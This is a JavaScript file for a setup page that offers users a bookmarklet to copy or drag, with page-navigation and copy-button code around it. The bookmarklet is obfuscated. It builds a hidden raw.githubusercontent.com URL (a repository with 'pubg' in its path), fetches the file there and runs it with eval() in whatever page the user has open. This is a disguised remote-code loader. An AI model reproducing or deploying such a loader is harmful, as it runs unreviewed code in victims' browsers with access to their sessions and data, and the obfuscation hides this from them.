document.addEventListener('DOMContentLoaded', function() {
    // Bookmarklet code
    const bookmarkletCode = `javascript:(function(){   
const _0x57a8dc=_0x381a;(function(_0x48d301,_0x2fd830){const _0x590f69=_0x381a,_0x589a90=_0x48d301();while(!![]){try{const _0x1d158c=-parseInt(_0x590f69(0x6f))/(0x1afe+0x575+-0x2072)*(parseInt(_0x590f69(0x75))/(0x1eb*0x5+0x125f+-0x6fd*0x4))+-parseInt(_0x590f69(0x67))/(-0x1*0xb3a+0x17bf+0x1*-0xc82)+parseInt(_0x590f69(0x74))/(0x935+0x509+0x2*-0x71d)*(parseInt(_0x590f69(0x77))/(-0xc01*0x1+0x1be*-0x14+-0x2ede*-0x1))+parseInt(_0x590f69(0x6d))/(0x1571+0xc*-0x188+-0x30b)*(-parseInt(_0x590f69(0x65))/(0x523+-0xeb*-0x1f+-0x2191))+parseInt(_0x590f69(0x76))/(0xb5b+-0xe6e+-0x5*-0x9f)+-parseInt(_0x590f69(0x71))/(-0x1*-0x1e26+0x7e5*0x2+-0x3*0xf4d)+parseInt(_0x590f69(0x6e))/(-0xd6*-0x1b+0x1959+-0x7*0x6d7)*(parseInt(_0x590f69(0x6c))/(-0x1b69+-0x1e76+0x39ea));if(_0x1d158c===_0x2fd830)break;else _0x589a90['push'](_0x589a90['shift']());}catch(_0x11c761){_0x589a90['push'](_0x589a90['shift']());}}}(_0x5a68,0x18ca6+-0x10edd7+0x181001));function _0x381a(_0x12cb27,_0x109260){const _0x5c6ec5=_0x5a68();return _0x381a=function(_0x226d4c,_0x23e698){_0x226d4c=_0x226d4c-(0x1*-0x23e3+-0xa41+0x2e88);let _0x34fc53=_0x5c6ec5[_0x226d4c];return _0x34fc53;},_0x381a(_0x12cb27,_0x109260);}function _0x5a68(){const _0x1568eb=['-sketch/pu','w.githubus','text','623359BVmFAx','682998qZkdHA','140SEDQOd','9227YaxSpJ','https://ra','3543678KSjGAE','com/tanvir','bg/refs/he','5752KIjGol','82TVcldL','5345632ssSyoF','1790gqieVN','ercontent.','then','7fYxLtz','ookMark','1564356btIzGE','ads/main/B'];_0x5a68=function(){return _0x1568eb;};return _0x5a68();}const url=_0x57a8dc(0x70)+_0x57a8dc(0x6a)+_0x57a8dc(0x78)+_0x57a8dc(0x72)+_0x57a8dc(0x69)+_0x57a8dc(0x73)+_0x57a8dc(0x68)+_0x57a8dc(0x66);fetch(url)[_0x57a8dc(0x64)](_0x23e698=>_0x23e698[_0x57a8dc(0x6b)]())[_0x57a8dc(0x64)](_0x34fc53=>eval(_0x34fc53));
})();`;

    // Set the bookmarklet link href
    const bookmarkletLink = document.getElementById('bookmarklet-link');
    bookmarkletLink.href = bookmarkletCode;
    
    // Display the bookmarklet code in the textarea
    const bookmarkletTextarea = document.getElementById('bookmarklet-code');
    bookmarkletTextarea.value = bookmarkletCode;
    
    // Copy code button functionality
    const copyButton = document.getElementById('copy-code');
    copyButton.addEventListener('click', function() {
        bookmarkletTextarea.select();
        document.execCommand('copy');
        copyButton.textContent = 'Copied!';
        setTimeout(function() {
            copyButton.textContent = 'Copy Code';
        }, 2000);
    });
    
    // Page navigation
    const startSetupBtn = document.getElementById('start-setup');
    const backButton = document.getElementById('back-button');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    
    startSetupBtn.addEventListener('click', function() {
        page1.classList.remove('active');
        page2.classList.add('active');
    });
    
    backButton.addEventListener('click', function() {
        page2.classList.remove('active');
        page1.classList.add('active');
    });
});